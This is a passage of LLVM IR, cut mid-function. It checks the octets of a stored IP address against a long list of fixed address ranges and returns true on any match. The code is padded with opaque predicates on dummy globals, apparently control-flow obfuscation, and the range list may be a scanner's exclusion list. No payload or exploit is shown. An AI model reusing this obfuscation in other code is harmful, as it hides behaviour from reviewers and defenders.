; <label>:4938:                                   ; preds = %4934
  %4939 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4940 = zext i8 %4939 to i32
  %4941 = icmp sge i32 %4940, 128
  br i1 %4941, label %4942, label %4946

; <label>:4942:                                   ; preds = %4938
  %4943 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4944 = zext i8 %4943 to i32
  %4945 = icmp slt i32 %4944, 255
  br i1 %4945, label %5298, label %4946

; <label>:4946:                                   ; preds = %4942, %4938, %4934, %originalBBpart2696
  %4947 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4948 = zext i8 %4947 to i32
  %4949 = icmp eq i32 %4948, 212
  br i1 %4949, label %4950, label %4994

; <label>:4950:                                   ; preds = %4946
  %4951 = load i32, i32* @x.65
  %4952 = load i32, i32* @y.66
  %4953 = sub i32 %4951, 1
  %4954 = mul i32 %4951, %4953
  %4955 = urem i32 %4954, 2
  %4956 = icmp eq i32 %4955, 0
  %4957 = icmp slt i32 %4952, 10
  %4958 = or i1 %4956, %4957
  br i1 %4958, label %originalBB698, label %originalBB698alteredBB

originalBB698:                                    ; preds = %originalBB698alteredBB, %4950
  %4959 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4960 = zext i8 %4959 to i32
  %4961 = icmp eq i32 %4960, 47
  %4962 = load i32, i32* @x.65
  %4963 = load i32, i32* @y.66
  %4964 = sub i32 %4962, 1
  %4965 = mul i32 %4962, %4964
  %4966 = urem i32 %4965, 2
  %4967 = icmp eq i32 %4966, 0
  %4968 = icmp slt i32 %4963, 10
  %4969 = or i1 %4967, %4968
  br i1 %4969, label %originalBBpart2700, label %originalBB698alteredBB

originalBBpart2700:                               ; preds = %originalBB698
  br i1 %4961, label %4970, label %4994

; <label>:4970:                                   ; preds = %originalBBpart2700
  %4971 = load i32, i32* @x.65
  %4972 = load i32, i32* @y.66
  %4973 = sub i32 %4971, 1
  %4974 = mul i32 %4971, %4973
  %4975 = urem i32 %4974, 2
  %4976 = icmp eq i32 %4975, 0
  %4977 = icmp slt i32 %4972, 10
  %4978 = or i1 %4976, %4977
  br i1 %4978, label %originalBB702, label %originalBB702alteredBB

originalBB702:                                    ; preds = %originalBB702alteredBB, %4970
  %4979 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4980 = zext i8 %4979 to i32
  %4981 = icmp sge i32 %4980, 224
  %4982 = load i32, i32* @x.65
  %4983 = load i32, i32* @y.66
  %4984 = sub i32 %4982, 1
  %4985 = mul i32 %4982, %4984
  %4986 = urem i32 %4985, 2
  %4987 = icmp eq i32 %4986, 0
  %4988 = icmp slt i32 %4983, 10
  %4989 = or i1 %4987, %4988
  br i1 %4989, label %originalBBpart2704, label %originalBB702alteredBB

originalBBpart2704:                               ; preds = %originalBB702
  br i1 %4981, label %4990, label %4994

; <label>:4990:                                   ; preds = %originalBBpart2704
  %4991 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4992 = zext i8 %4991 to i32
  %4993 = icmp slt i32 %4992, 255
  br i1 %4993, label %5298, label %4994

; <label>:4994:                                   ; preds = %4990, %originalBBpart2704, %originalBBpart2700, %4946
  %4995 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4996 = zext i8 %4995 to i32
  %4997 = icmp eq i32 %4996, 89
  br i1 %4997, label %4998, label %5026

; <label>:4998:                                   ; preds = %4994
  %4999 = load i32, i32* @x.65
  %5000 = load i32, i32* @y.66
  %5001 = sub i32 %4999, 1
  %5002 = mul i32 %4999, %5001
  %5003 = urem i32 %5002, 2
  %5004 = icmp eq i32 %5003, 0
  %5005 = icmp slt i32 %5000, 10
  %5006 = or i1 %5004, %5005
  br i1 %5006, label %originalBB706, label %originalBB706alteredBB

originalBB706:                                    ; preds = %originalBB706alteredBB, %4998
  %5007 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5008 = zext i8 %5007 to i32
  %5009 = icmp eq i32 %5008, 34
  %5010 = load i32, i32* @x.65
  %5011 = load i32, i32* @y.66
  %5012 = sub i32 %5010, 1
  %5013 = mul i32 %5010, %5012
  %5014 = urem i32 %5013, 2
  %5015 = icmp eq i32 %5014, 0
  %5016 = icmp slt i32 %5011, 10
  %5017 = or i1 %5015, %5016
  br i1 %5017, label %originalBBpart2708, label %originalBB706alteredBB

originalBBpart2708:                               ; preds = %originalBB706
  br i1 %5009, label %5018, label %5026

; <label>:5018:                                   ; preds = %originalBBpart2708
  %5019 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5020 = zext i8 %5019 to i32
  %5021 = icmp sge i32 %5020, 96
  br i1 %5021, label %5022, label %5026

; <label>:5022:                                   ; preds = %5018
  %5023 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5024 = zext i8 %5023 to i32
  %5025 = icmp slt i32 %5024, 97
  br i1 %5025, label %5298, label %5026

; <label>:5026:                                   ; preds = %5022, %5018, %originalBBpart2708, %4994
  %5027 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5028 = zext i8 %5027 to i32
  %5029 = icmp eq i32 %5028, 219
  br i1 %5029, label %5030, label %5038

; <label>:5030:                                   ; preds = %5026
  %5031 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5032 = zext i8 %5031 to i32
  %5033 = icmp sge i32 %5032, 216
  br i1 %5033, label %5034, label %5038

; <label>:5034:                                   ; preds = %5030
  %5035 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5036 = zext i8 %5035 to i32
  %5037 = icmp slt i32 %5036, 231
  br i1 %5037, label %5298, label %5038

; <label>:5038:                                   ; preds = %5034, %5030, %5026
  %5039 = load i32, i32* @x.65
  %5040 = load i32, i32* @y.66
  %5041 = sub i32 %5039, 1
  %5042 = mul i32 %5039, %5041
  %5043 = urem i32 %5042, 2
  %5044 = icmp eq i32 %5043, 0
  %5045 = icmp slt i32 %5040, 10
  %5046 = or i1 %5044, %5045
  br i1 %5046, label %originalBB710, label %originalBB710alteredBB

originalBB710:                                    ; preds = %originalBB710alteredBB, %5038
  %5047 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5048 = zext i8 %5047 to i32
  %5049 = icmp eq i32 %5048, 23
  %5050 = load i32, i32* @x.65
  %5051 = load i32, i32* @y.66
  %5052 = sub i32 %5050, 1
  %5053 = mul i32 %5050, %5052
  %5054 = urem i32 %5053, 2
  %5055 = icmp eq i32 %5054, 0
  %5056 = icmp slt i32 %5051, 10
  %5057 = or i1 %5055, %5056
  br i1 %5057, label %originalBBpart2712, label %originalBB710alteredBB

originalBBpart2712:                               ; preds = %originalBB710
  br i1 %5049, label %5058, label %5066

; <label>:5058:                                   ; preds = %originalBBpart2712
  %5059 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5060 = zext i8 %5059 to i32
  %5061 = icmp sge i32 %5060, 94
  br i1 %5061, label %5062, label %5066

; <label>:5062:                                   ; preds = %5058
  %5063 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5064 = zext i8 %5063 to i32
  %5065 = icmp slt i32 %5064, 109
  br i1 %5065, label %5298, label %5066

; <label>:5066:                                   ; preds = %5062, %5058, %originalBBpart2712
  %5067 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5068 = zext i8 %5067 to i32
  %5069 = icmp eq i32 %5068, 178
  br i1 %5069, label %5070, label %5078

; <label>:5070:                                   ; preds = %5066
  %5071 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5072 = zext i8 %5071 to i32
  %5073 = icmp sge i32 %5072, 62
  br i1 %5073, label %5074, label %5078

; <label>:5074:                                   ; preds = %5070
  %5075 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5076 = zext i8 %5075 to i32
  %5077 = icmp slt i32 %5076, 63
  br i1 %5077, label %5298, label %5078

; <label>:5078:                                   ; preds = %5074, %5070, %5066
  %5079 = load i32, i32* @x.65
  %5080 = load i32, i32* @y.66
  %5081 = sub i32 %5079, 1
  %5082 = mul i32 %5079, %5081
  %5083 = urem i32 %5082, 2
  %5084 = icmp eq i32 %5083, 0
  %5085 = icmp slt i32 %5080, 10
  %5086 = or i1 %5084, %5085
  br i1 %5086, label %originalBB714, label %originalBB714alteredBB

originalBB714:                                    ; preds = %originalBB714alteredBB, %5078
  %5087 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5088 = zext i8 %5087 to i32
  %5089 = icmp eq i32 %5088, 106
  %5090 = load i32, i32* @x.65
  %5091 = load i32, i32* @y.66
  %5092 = sub i32 %5090, 1
  %5093 = mul i32 %5090, %5092
  %5094 = urem i32 %5093, 2
  %5095 = icmp eq i32 %5094, 0
  %5096 = icmp slt i32 %5091, 10
  %5097 = or i1 %5095, %5096
  br i1 %5097, label %originalBBpart2716, label %originalBB714alteredBB

originalBBpart2716:                               ; preds = %originalBB714
  br i1 %5089, label %5098, label %5106

; <label>:5098:                                   ; preds = %originalBBpart2716
  %5099 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5100 = zext i8 %5099 to i32
  %5101 = icmp sge i32 %5100, 182
  br i1 %5101, label %5102, label %5106

; <label>:5102:                                   ; preds = %5098
  %5103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5104 = zext i8 %5103 to i32
  %5105 = icmp slt i32 %5104, 189
  br i1 %5105, label %5298, label %5106

; <label>:5106:                                   ; preds = %5102, %5098, %originalBBpart2716
  %5107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5108 = zext i8 %5107 to i32
  %5109 = icmp eq i32 %5108, 106
  br i1 %5109, label %5110, label %5114

; <label>:5110:                                   ; preds = %5106
  %5111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5112 = zext i8 %5111 to i32
  %5113 = icmp sge i32 %5112, 184
  br i1 %5113, label %5298, label %5114

; <label>:5114:                                   ; preds = %5110, %5106
  %5115 = load i32, i32* @x.65
  %5116 = load i32, i32* @y.66
  %5117 = sub i32 %5115, 1
  %5118 = mul i32 %5115, %5117
  %5119 = urem i32 %5118, 2
  %5120 = icmp eq i32 %5119, 0
  %5121 = icmp slt i32 %5116, 10
  %5122 = or i1 %5120, %5121
  br i1 %5122, label %originalBB718, label %originalBB718alteredBB

originalBB718:                                    ; preds = %originalBB718alteredBB, %5114
  %5123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5124 = zext i8 %5123 to i32
  %5125 = icmp eq i32 %5124, 106
  %5126 = load i32, i32* @x.65
  %5127 = load i32, i32* @y.66
  %5128 = sub i32 %5126, 1
  %5129 = mul i32 %5126, %5128
  %5130 = urem i32 %5129, 2
  %5131 = icmp eq i32 %5130, 0
  %5132 = icmp slt i32 %5127, 10
  %5133 = or i1 %5131, %5132
  br i1 %5133, label %originalBBpart2720, label %originalBB718alteredBB

originalBBpart2720:                               ; preds = %originalBB718
  br i1 %5125, label %5134, label %5138

; <label>:5134:                                   ; preds = %originalBBpart2720
  %5135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5136 = zext i8 %5135 to i32
  %5137 = icmp eq i32 %5136, 105
  br i1 %5137, label %5298, label %5138

; <label>:5138:                                   ; preds = %5134, %originalBBpart2720
  %5139 = load i32, i32* @x.65
  %5140 = load i32, i32* @y.66
  %5141 = sub i32 %5139, 1
  %5142 = mul i32 %5139, %5141
  %5143 = urem i32 %5142, 2
  %5144 = icmp eq i32 %5143, 0
  %5145 = icmp slt i32 %5140, 10
  %5146 = or i1 %5144, %5145
  br i1 %5146, label %originalBB722, label %originalBB722alteredBB

originalBB722:                                    ; preds = %originalBB722alteredBB, %5138
  %5147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5148 = zext i8 %5147 to i32
  %5149 = icmp eq i32 %5148, 34
  %5150 = load i32, i32* @x.65
  %5151 = load i32, i32* @y.66
  %5152 = sub i32 %5150, 1
  %5153 = mul i32 %5150, %5152
  %5154 = urem i32 %5153, 2
  %5155 = icmp eq i32 %5154, 0
  %5156 = icmp slt i32 %5151, 10
  %5157 = or i1 %5155, %5156
  br i1 %5157, label %originalBBpart2724, label %originalBB722alteredBB

originalBBpart2724:                               ; preds = %originalBB722
  br i1 %5149, label %5158, label %5182

; <label>:5158:                                   ; preds = %originalBBpart2724
  %5159 = load i32, i32* @x.65
  %5160 = load i32, i32* @y.66
  %5161 = sub i32 %5159, 1
  %5162 = mul i32 %5159, %5161
  %5163 = urem i32 %5162, 2
  %5164 = icmp eq i32 %5163, 0
  %5165 = icmp slt i32 %5160, 10
  %5166 = or i1 %5164, %5165
  br i1 %5166, label %originalBB726, label %originalBB726alteredBB

originalBB726:                                    ; preds = %originalBB726alteredBB, %5158
  %5167 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5168 = zext i8 %5167 to i32
  %5169 = icmp sge i32 %5168, 245
  %5170 = load i32, i32* @x.65
  %5171 = load i32, i32* @y.66
  %5172 = sub i32 %5170, 1
  %5173 = mul i32 %5170, %5172
  %5174 = urem i32 %5173, 2
  %5175 = icmp eq i32 %5174, 0
  %5176 = icmp slt i32 %5171, 10
  %5177 = or i1 %5175, %5176
  br i1 %5177, label %originalBBpart2728, label %originalBB726alteredBB

originalBBpart2728:                               ; preds = %originalBB726
  br i1 %5169, label %5178, label %5182

; <label>:5178:                                   ; preds = %originalBBpart2728
  %5179 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5180 = zext i8 %5179 to i32
  %5181 = icmp slt i32 %5180, 255
  br i1 %5181, label %5298, label %5182

; <label>:5182:                                   ; preds = %5178, %originalBBpart2728, %originalBBpart2724
  %5183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5184 = zext i8 %5183 to i32
  %5185 = icmp eq i32 %5184, 87
  br i1 %5185, label %5186, label %5194

; <label>:5186:                                   ; preds = %5182
  %5187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5188 = zext i8 %5187 to i32
  %5189 = icmp sge i32 %5188, 97
  br i1 %5189, label %5190, label %5194

; <label>:5190:                                   ; preds = %5186
  %5191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5192 = zext i8 %5191 to i32
  %5193 = icmp slt i32 %5192, 99
  br i1 %5193, label %5298, label %5194

; <label>:5194:                                   ; preds = %5190, %5186, %5182
  %5195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5196 = zext i8 %5195 to i32
  %5197 = icmp eq i32 %5196, 86
  br i1 %5197, label %5198, label %5218

; <label>:5198:                                   ; preds = %5194
  %5199 = load i32, i32* @x.65
  %5200 = load i32, i32* @y.66
  %5201 = sub i32 %5199, 1
  %5202 = mul i32 %5199, %5201
  %5203 = urem i32 %5202, 2
  %5204 = icmp eq i32 %5203, 0
  %5205 = icmp slt i32 %5200, 10
  %5206 = or i1 %5204, %5205
  br i1 %5206, label %originalBB730, label %originalBB730alteredBB

originalBB730:                                    ; preds = %originalBB730alteredBB, %5198
  %5207 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5208 = zext i8 %5207 to i32
  %5209 = icmp eq i32 %5208, 208
  %5210 = load i32, i32* @x.65
  %5211 = load i32, i32* @y.66
  %5212 = sub i32 %5210, 1
  %5213 = mul i32 %5210, %5212
  %5214 = urem i32 %5213, 2
  %5215 = icmp eq i32 %5214, 0
  %5216 = icmp slt i32 %5211, 10
  %5217 = or i1 %5215, %5216
  br i1 %5217, label %originalBBpart2732, label %originalBB730alteredBB

originalBBpart2732:                               ; preds = %originalBB730
  br i1 %5209, label %5298, label %5218

; <label>:5218:                                   ; preds = %originalBBpart2732, %5194
  %5219 = load i32, i32* @x.65
  %5220 = load i32, i32* @y.66
  %5221 = sub i32 %5219, 1
  %5222 = mul i32 %5219, %5221
  %5223 = urem i32 %5222, 2
  %5224 = icmp eq i32 %5223, 0
  %5225 = icmp slt i32 %5220, 10
  %5226 = or i1 %5224, %5225
  br i1 %5226, label %originalBB734, label %originalBB734alteredBB

originalBB734:                                    ; preds = %originalBB734alteredBB, %5218
  %5227 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5228 = zext i8 %5227 to i32
  %5229 = icmp eq i32 %5228, 86
  %5230 = load i32, i32* @x.65
  %5231 = load i32, i32* @y.66
  %5232 = sub i32 %5230, 1
  %5233 = mul i32 %5230, %5232
  %5234 = urem i32 %5233, 2
  %5235 = icmp eq i32 %5234, 0
  %5236 = icmp slt i32 %5231, 10
  %5237 = or i1 %5235, %5236
  br i1 %5237, label %originalBBpart2736, label %originalBB734alteredBB

originalBBpart2736:                               ; preds = %originalBB734
  br i1 %5229, label %5238, label %5242

; <label>:5238:                                   ; preds = %originalBBpart2736
  %5239 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5240 = zext i8 %5239 to i32
  %5241 = icmp eq i32 %5240, 209
  br i1 %5241, label %5298, label %5242

; <label>:5242:                                   ; preds = %5238, %originalBBpart2736
  %5243 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5244 = zext i8 %5243 to i32
  %5245 = icmp eq i32 %5244, 193
  br i1 %5245, label %5246, label %5250

; <label>:5246:                                   ; preds = %5242
  %5247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5248 = zext i8 %5247 to i32
  %5249 = icmp eq i32 %5248, 164
  br i1 %5249, label %5298, label %5250

; <label>:5250:                                   ; preds = %5246, %5242
  %5251 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5252 = zext i8 %5251 to i32
  %5253 = icmp eq i32 %5252, 120
  br i1 %5253, label %5254, label %5262

; <label>:5254:                                   ; preds = %5250
  %5255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5256 = zext i8 %5255 to i32
  %5257 = icmp sge i32 %5256, 103
  br i1 %5257, label %5258, label %5262

; <label>:5258:                                   ; preds = %5254
  %5259 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5260 = zext i8 %5259 to i32
  %5261 = icmp slt i32 %5260, 108
  br i1 %5261, label %5298, label %5262

; <label>:5262:                                   ; preds = %5258, %5254, %5250
  %5263 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5264 = zext i8 %5263 to i32
  %5265 = icmp eq i32 %5264, 188
  br i1 %5265, label %5266, label %5270

; <label>:5266:                                   ; preds = %5262
  %5267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5268 = zext i8 %5267 to i32
  %5269 = icmp eq i32 %5268, 68
  br i1 %5269, label %5298, label %5270

; <label>:5270:                                   ; preds = %5266, %5262
  %5271 = load i32, i32* @x.65
  %5272 = load i32, i32* @y.66
  %5273 = sub i32 %5271, 1
  %5274 = mul i32 %5271, %5273
  %5275 = urem i32 %5274, 2
  %5276 = icmp eq i32 %5275, 0
  %5277 = icmp slt i32 %5272, 10
  %5278 = or i1 %5276, %5277
  br i1 %5278, label %originalBB738, label %originalBB738alteredBB

originalBB738:                                    ; preds = %originalBB738alteredBB, %5270
  %5279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5280 = zext i8 %5279 to i32
  %5281 = icmp eq i32 %5280, 78
  %5282 = load i32, i32* @x.65
  %5283 = load i32, i32* @y.66
  %5284 = sub i32 %5282, 1
  %5285 = mul i32 %5282, %5284
  %5286 = urem i32 %5285, 2
  %5287 = icmp eq i32 %5286, 0
  %5288 = icmp slt i32 %5283, 10
  %5289 = or i1 %5287, %5288
  br i1 %5289, label %originalBBpart2740, label %originalBB738alteredBB

originalBBpart2740:                               ; preds = %originalBB738
  br i1 %5281, label %5290, label %5294

; <label>:5290:                                   ; preds = %originalBBpart2740
  %5291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5292 = zext i8 %5291 to i32
  %5293 = icmp eq i32 %5292, 46
  br i1 %5293, label %5298, label %5294

; <label>:5294:                                   ; preds = %5290, %originalBBpart2740
  %5295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5296 = zext i8 %5295 to i32
  %5297 = icmp eq i32 %5296, 224
  br label %5298

; <label>:5298:                                   ; preds = %5294, %5290, %5266, %5258, %5246, %5238, %originalBBpart2732, %5190, %5178, %5134, %5110, %5102, %5074, %5062, %5034, %5022, %4990, %4942, %originalBBpart2692, %4866, %4858, %4846, %4834, %4806, %originalBBpart2676, %4734, %4722, %4694, %4666, %originalBBpart2656, %originalBBpart2648, %originalBBpart2644, %4490, %4474, %originalBBpart2628, %4394, %4346, %originalBBpart2608, %4282, %4250, %originalBBpart2600, %4186, %4154, %originalBBpart2580, %4058, %4026, %originalBBpart2564, %3970, %originalBBpart2556, %3906, %originalBBpart2548, %3874, %3866, %originalBBpart2540, %3802, %originalBBpart2532, %originalBBpart2528, %originalBBpart2524, %3706, %3682, %3658, %originalBBpart2504, %3610, %3602, %3586, %originalBBpart2496, %originalBBpart2492, %originalBBpart2484, %3394, %3362, %3346, %originalBBpart2456, %originalBBpart2440, %3138, %3106, %3090, %3082, %originalBBpart2420, %3026, %2978, %2962, %2930, %2898, %originalBBpart2396, %2834, %originalBBpart2388, %2786, %2754, %2722, %originalBBpart2368, %2610, %2562, %2514, %2482, %2450, %originalBBpart2328, %2370, %2354, %2290, %2282, %2258, %2250, %originalBBpart2304, %2218, %2194, %2186, %2178, %2154, %2146, %2138, %2130, %originalBBpart2292, %2090, %originalBBpart2288, %2050, %originalBBpart2280, %1994, %1966, %1938, %1910, %1882, %1854, %1842, %originalBBpart2256, %originalBBpart2252, %originalBBpart2248, %originalBBpart2240, %1670, %1658, %1630, %originalBBpart2224, %originalBBpart2220, %1546, %originalBBpart2212, %1506, %1478, %1450, %1406, %originalBBpart2192, %1350, %1322, %originalBBpart2180, %originalBBpart2176, %1254, %1226, %originalBBpart2164, %1170, %1158, %originalBBpart2156, %originalBBpart2144, %originalBBpart2136, %originalBBpart2128, %958, %930, %886, %878, %870, %846, %838, %814, %originalBBpart2104, %782, %758, %734, %originalBBpart292, %702, %originalBBpart288, %654, %630, %606, %582, %574, %originalBBpart264, %526, %originalBBpart260, %originalBBpart256, %originalBBpart252, %430, %originalBBpart244, %398, %originalBBpart240, %366, %358, %originalBBpart236, %originalBBpart232, %302, %294, %286, %278, %254, %246, %222, %originalBBpart220, %190, %182, %178, %174, %170, %originalBBpart216, %146, %originalBBpart212, %122, %118, %114, %originalBBpart28, %originalBBpart24, %70, %66, %62, %58, %originalBBpart2, %34, %30, %26, %22, %18, %14
  %5299 = phi i1 [ true, %5290 ], [ true, %5266 ], [ true, %5258 ], [ true, %5246 ], [ true, %5238 ], [ true, %originalBBpart2732 ], [ true, %5190 ], [ true, %5178 ], [ true, %5134 ], [ true, %5110 ], [ true, %5102 ], [ true, %5074 ], [ true, %5062 ], [ true, %5034 ], [ true, %5022 ], [ true, %4990 ], [ true, %4942 ], [ true, %originalBBpart2692 ], [ true, %4866 ], [ true, %4858 ], [ true, %4846 ], [ true, %4834 ], [ true, %4806 ], [ true, %originalBBpart2676 ], [ true, %4734 ], [ true, %4722 ], [ true, %4694 ], [ true, %4666 ], [ true, %originalBBpart2656 ], [ true, %originalBBpart2648 ], [ true, %originalBBpart2644 ], [ true, %4490 ], [ true, %4474 ], [ true, %originalBBpart2628 ], [ true, %4394 ], [ true, %4346 ], [ true, %originalBBpart2608 ], [ true, %4282 ], [ true, %4250 ], [ true, %originalBBpart2600 ], [ true, %4186 ], [ true, %4154 ], [ true, %originalBBpart2580 ], [ true, %4058 ], [ true, %4026 ], [ true, %originalBBpart2564 ], [ true, %3970 ], [ true, %originalBBpart2556 ], [ true, %3906 ], [ true, %originalBBpart2548 ], [ true, %3874 ], [ true, %3866 ], [ true, %originalBBpart2540 ], [ true, %3802 ], [ true, %originalBBpart2532 ], [ true, %originalBBpart2528 ], [ true, %originalBBpart2524 ], [ true, %3706 ], [ true, %3682 ], [ true, %3658 ], [ true, %originalBBpart2504 ], [ true, %3610 ], [ true, %3602 ], [ true, %3586 ], [ true, %originalBBpart2496 ], [ true, %originalBBpart2492 ], [ true, %originalBBpart2484 ], [ true, %3394 ], [ true, %3362 ], [ true, %3346 ], [ true, %originalBBpart2456 ], [ true, %originalBBpart2440 ], [ true, %3138 ], [ true, %3106 ], [ true, %3090 ], [ true, %3082 ], [ true, %originalBBpart2420 ], [ true, %3026 ], [ true, %2978 ], [ true, %2962 ], [ true, %2930 ], [ true, %2898 ], [ true, %originalBBpart2396 ], [ true, %2834 ], [ true, %originalBBpart2388 ], [ true, %2786 ], [ true, %2754 ], [ true, %2722 ], [ true, %originalBBpart2368 ], [ true, %2610 ], [ true, %2562 ], [ true, %2514 ], [ true, %2482 ], [ true, %2450 ], [ true, %originalBBpart2328 ], [ true, %2370 ], [ true, %2354 ], [ true, %2290 ], [ true, %2282 ], [ true, %2258 ], [ true, %2250 ], [ true, %originalBBpart2304 ], [ true, %2218 ], [ true, %2194 ], [ true, %2186 ], [ true, %2178 ], [ true, %2154 ], [ true, %2146 ], [ true, %2138 ], [ true, %2130 ], [ true, %originalBBpart2292 ], [ true, %2090 ], [ true, %originalBBpart2288 ], [ true, %2050 ], [ true, %originalBBpart2280 ], [ true, %1994 ], [ true, %1966 ], [ true, %1938 ], [ true, %1910 ], [ true, %1882 ], [ true, %1854 ], [ true, %1842 ], [ true, %originalBBpart2256 ], [ true, %originalBBpart2252 ], [ true, %originalBBpart2248 ], [ true, %originalBBpart2240 ], [ true, %1670 ], [ true, %1658 ], [ true, %1630 ], [ true, %originalBBpart2224 ], [ true, %originalBBpart2220 ], [ true, %1546 ], [ true, %originalBBpart2212 ], [ true, %1506 ], [ true, %1478 ], [ true, %1450 ], [ true, %1406 ], [ true, %originalBBpart2192 ], [ true, %1350 ], [ true, %1322 ], [ true, %originalBBpart2180 ], [ true, %originalBBpart2176 ], [ true, %1254 ], [ true, %1226 ], [ true, %originalBBpart2164 ], [ true, %1170 ], [ true, %1158 ], [ true, %originalBBpart2156 ], [ true, %originalBBpart2144 ], [ true, %originalBBpart2136 ], [ true, %originalBBpart2128 ], [ true, %958 ], [ true, %930 ], [ true, %886 ], [ true, %878 ], [ true, %870 ], [ true, %846 ], [ true, %838 ], [ true, %814 ], [ true, %originalBBpart2104 ], [ true, %782 ], [ true, %758 ], [ true, %734 ], [ true, %originalBBpart292 ], [ true, %702 ], [ true, %originalBBpart288 ], [ true, %654 ], [ true, %630 ], [ true, %606 ], [ true, %582 ], [ true, %574 ], [ true, %originalBBpart264 ], [ true, %526 ], [ true, %originalBBpart260 ], [ true, %originalBBpart256 ], [ true, %originalBBpart252 ], [ true, %430 ], [ true, %originalBBpart244 ], [ true, %398 ], [ true, %originalBBpart240 ], [ true, %366 ], [ true, %358 ], [ true, %originalBBpart236 ], [ true, %originalBBpart232 ], [ true, %302 ], [ true, %294 ], [ true, %286 ], [ true, %278 ], [ true, %254 ], [ true, %246 ], [ true, %222 ], [ true, %originalBBpart220 ], [ true, %190 ], [ true, %182 ], [ true, %178 ], [ true, %174 ], [ true, %170 ], [ true, %originalBBpart216 ], [ true, %146 ], [ true, %originalBBpart212 ], [ true, %122 ], [ true, %118 ], [ true, %114 ], [ true, %originalBBpart28 ], [ true, %originalBBpart24 ], [ true, %70 ], [ true, %66 ], [ true, %62 ], [ true, %58 ], [ true, %originalBBpart2 ], [ true, %34 ], [ true, %30 ], [ true, %26 ], [ true, %22 ], [ true, %18 ], [ true, %14 ], [ %5297, %5294 ]
